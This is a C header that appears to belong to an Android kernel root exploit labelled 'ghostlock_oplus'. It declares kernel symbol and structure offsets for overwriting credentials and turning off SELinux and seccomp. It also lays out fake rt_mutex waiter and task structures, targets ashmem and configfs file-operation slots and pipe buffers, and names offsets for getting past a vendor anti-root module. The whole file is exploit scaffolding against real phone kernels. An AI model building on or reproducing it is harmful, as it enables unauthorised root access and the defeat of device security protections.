#ifndef TARGET_H
#define TARGET_H

#include <stdint.h>

#define BUILD_VARIANT_LABEL "ghostlock_oplus"
/* ---- Memory layout (runtime-configurable, defined in preload.c) ---- */
extern uint64_t KIMAGE_TEXT_BASE;
extern uint64_t P0_PAGE_OFFSET;
extern uint64_t P0_PHYS_OFFSET;
extern uint64_t P0_KERNEL_PHYS_LOAD;
extern uint64_t KERNELSNITCH_IDENTITY_START;
extern uint64_t KERNELSNITCH_IDENTITY_END;
extern uint64_t DIRECT_MAP_BASE;
extern uint64_t DIRECT_MAP_END;
extern uint64_t VMEMMAP_START;

/* ---- Core kernel symbols (image-relative offsets, runtime-configurable) ---- */
extern uint32_t ASHMEM_MISC_FOPS_OFF;
extern uint32_t ASHMEM_FOPS_OFF;
extern uint32_t ASHMEM_IOCTL_OFF;
extern uint32_t ASHMEM_COMPAT_IOCTL_OFF;
extern uint32_t ASHMEM_MMAP_OFF;
extern uint32_t ASHMEM_OPEN_OFF;
extern uint32_t ASHMEM_RELEASE_OFF;
extern uint32_t ASHMEM_SHOW_FDINFO_OFF;
extern uint32_t CONFIGFS_READ_ITER_OFF;
extern uint32_t CONFIGFS_BIN_WRITE_ITER_OFF;
extern uint32_t COPY_SPLICE_READ_OFF;
extern uint32_t NOOP_LLSEEK_OFF;
extern uint32_t INIT_TASK_OFF;
extern uint32_t INIT_CRED_OFF;
extern uint32_t ROOT_TASK_GROUP_OFF;
extern uint32_t SELINUX_BLOB_SIZES_OFF;
extern uint32_t SELINUX_ENFORCING_OFF;
extern uint32_t SECURITY_HOOK_HEADS_OFF;
extern uint32_t KMALLOC_CACHES_OFF;
extern uint32_t ANON_PIPE_BUF_OPS_OFF;

extern uint32_t SLIDE_NFULNL_LOGGER_OFF;
extern uint32_t SLIDE_LOGGERS_0_1_OFF;
extern uint32_t SLIDE_RANDOM_BOOT_ID_DATA_OFF;

extern uint32_t SLIDE_SYSCTL_BOOTID_OFF;
/* Kernel addresses. */
#define INIT_TASK (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define INIT_CRED (KIMAGE_TEXT_BASE + INIT_CRED_OFF)
#define ROOT_TASK_GROUP (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SELINUX_ENFORCING (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
#define SELINUX_BLOB_SIZES (KIMAGE_TEXT_BASE + SELINUX_BLOB_SIZES_OFF)
#define SECURITY_HOOK_HEADS (KIMAGE_TEXT_BASE + SECURITY_HOOK_HEADS_OFF)
#define KMALLOC_CACHES (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
#define ANON_PIPE_BUF_OPS (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)
#define ASHMEM_MISC_FOPS (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
#define ASHMEM_FOPS (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
#define ASHMEM_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
#define ASHMEM_COMPAT_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
#define ASHMEM_MMAP (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
#define ASHMEM_OPEN (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
#define ASHMEM_RELEASE (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
#define ASHMEM_SHOW_FDINFO (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)
#define CONFIGFS_READ_ITER (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF)
#define CONFIGFS_BIN_WRITE_ITER (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF)
#define COPY_SPLICE_READ (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
#define NOOP_LLSEEK (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)
#define SLIDE_NFULNL_LOGGER_IMAGE (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OFF)
#define SLIDE_LOGGERS_0_1_IMAGE (KIMAGE_TEXT_BASE + SLIDE_LOGGERS_0_1_OFF)
#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE (KIMAGE_TEXT_BASE + SLIDE_RANDOM_BOOT_ID_DATA_OFF)
#define SLIDE_INIT_TASK_IMAGE (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define SLIDE_ROOT_TASK_GROUP_IMAGE (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SLIDE_SYSCTL_BOOTID_IMAGE (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)

extern uint32_t PSELECT_WAITER_WORD_SHIFT;

/* Fake waiter and task layouts. */
extern uint32_t FAKE_WAITER_TREE_PRIO_OFF;
extern uint32_t FAKE_WAITER_TREE_DEADLINE_OFF;
extern uint32_t FAKE_WAITER_PI_TREE_ENTRY_OFF;
extern uint32_t FAKE_WAITER_PI_TREE_PRIO_OFF;
extern uint32_t FAKE_WAITER_PI_TREE_DEADLINE_OFF;
extern uint32_t FAKE_WAITER_TASK_OFF;
extern uint32_t FAKE_WAITER_LOCK_OFF;
extern uint32_t FAKE_WAITER_WAKE_STATE_OFF;
extern uint32_t FAKE_WAITER_WW_CTX_OFF;

extern uint32_t FAKE_TASK_USAGE_OFF;
extern uint32_t FAKE_TASK_PRIO_OFF;
extern uint32_t FAKE_TASK_NORMAL_PRIO_OFF;
extern uint32_t FAKE_TASK_TASK_GROUP_OFF;
extern uint32_t FAKE_TASK_PI_LOCK_OFF;
extern uint32_t FAKE_TASK_PI_WAITERS_OFF;
extern uint32_t FAKE_TASK_PI_TOP_TASK_OFF;
extern uint32_t FAKE_TASK_PI_BLOCKED_ON_OFF;

extern uint32_t TASK_PID_OFF;
extern uint32_t TASK_TGID_OFF;
extern uint32_t TASK_ATOMIC_FLAGS_OFF;
extern uint32_t TASK_REAL_CRED_OFF;
extern uint32_t TASK_CRED_OFF;
extern uint32_t TASK_COMM_OFF;
extern uint32_t TASK_TASKS_OFF;
extern uint32_t TASK_THREAD_INFO_FLAGS_OFF;
extern uint32_t TASK_SECCOMP_OFF;

/* ---- vivo vr.ko anti-root per-task tag (same GKI as PD2405) ---- */
extern uint32_t VR_TAG_A_OFF;
extern uint32_t VR_TAG_B_OFF;
extern uint32_t VR_SYSCALL_TP_FLAG;

/* ---- cred structure offsets (BTF) ---- */
extern uint32_t CRED_UID_OFF;
extern uint32_t CRED_SECUREBITS_OFF;
extern uint32_t CRED_CAPS_OFF;
extern uint32_t CRED_SECURITY_OFF;
extern uint32_t SELINUX_CRED_BLOB_OFF;
extern uint32_t SELINUX_CRED_OSID_OFF;
extern uint32_t SELINUX_CRED_SID_OFF;

/* ---- seccomp offsets ---- */
extern uint32_t SECCOMP_MODE_OFF;
extern uint32_t SECCOMP_FILTER_COUNT_OFF;
extern uint32_t SECCOMP_FILTER_OFF;
extern uint32_t TIF_SECCOMP_BIT;
extern uint32_t PFA_NO_NEW_PRIVS_BIT;

/* ---- struct page / slab offsets ---- */
extern uint32_t STRUCT_PAGE_SIZE;
extern uint32_t STRUCT_PAGE_COMPOUND_HEAD_OFF;
extern uint32_t STRUCT_SLAB_CACHE_OFF;
extern uint32_t STRUCT_PAGE_TYPE_OFF;

/* ---- pipe_buffer offsets ---- */
extern uint32_t PIPE_BUFFER_SLOTS;
extern uint32_t PIPE_BUF_FLAG_CAN_MERGE;

/* ---- struct file_operations slot offsets ---- */
extern uint32_t FOPS_OWNER_OFF;
extern uint32_t FOPS_LLSEEK_OFF;
extern uint32_t FOPS_READ_OFF;
extern uint32_t FOPS_WRITE_OFF;
extern uint32_t FOPS_READ_ITER_OFF;
extern uint32_t FOPS_WRITE_ITER_OFF;
extern uint32_t FOPS_IOCTL_OFF;
extern uint32_t FOPS_COMPAT_IOCTL_OFF;
extern uint32_t FOPS_MMAP_OFF;
extern uint32_t FOPS_OPEN_OFF;
extern uint32_t FOPS_RELEASE_OFF;
extern uint32_t FOPS_SPLICE_READ_OFF;
extern uint32_t FOPS_SHOW_FDINFO_OFF;

extern uint32_t LOCK_OFF;
extern uint32_t W0_OFF;
extern uint32_t FOPS_OFF;
extern uint32_t SCRATCH_OFF;
extern uint32_t RIGHT_OFF;
extern uint32_t LEFT_OFF;
extern uint32_t FAKE_TASK_OFF;

extern uint32_t CFG_PAGE_OFF;
extern uint32_t CFG_NEEDS_READ_FILL_OFF;
extern uint32_t CFG_BIN_BUFFER_OFF;
extern uint32_t CFG_BIN_BUFFER_SIZE_OFF;
extern uint32_t CFG_CB_MAX_SIZE_OFF;

/* ---- tracepoint struct offsets (BTF) ---- */
extern uint32_t SYS_EXIT_TP_OFF;
extern uint32_t RVH_COMMIT_CREDS_TP_OFF;
extern uint32_t TRACEPOINT_PROBESTUB_OFF;
extern uint32_t TRACEPOINT_FUNCS_OFF;
extern uint32_t TRACEPOINT_FUNC_STRIDE;
extern uint32_t TRACEPOINT_FUNC_FUNC_OFF;
extern uint32_t VR_COMMIT_TO_SYSEXIT_DELTA;
extern uint32_t VR_KERNEL_IMAGE_MAX;
#define SYS_EXIT_TP        (KIMAGE_TEXT_BASE + SYS_EXIT_TP_OFF)
#define RVH_COMMIT_CREDS_TP (KIMAGE_TEXT_BASE + RVH_COMMIT_CREDS_TP_OFF)

/* W2 payload. */
#define CRED_COPY_OFF 0x1080

/* Slide calibration. */
#define SLIDE_PSELECT_WORD_SHIFT 0
#define SLIDE_PSELECT_NFDS 320
#define SLIDE_USE_SELECT 1

#endif
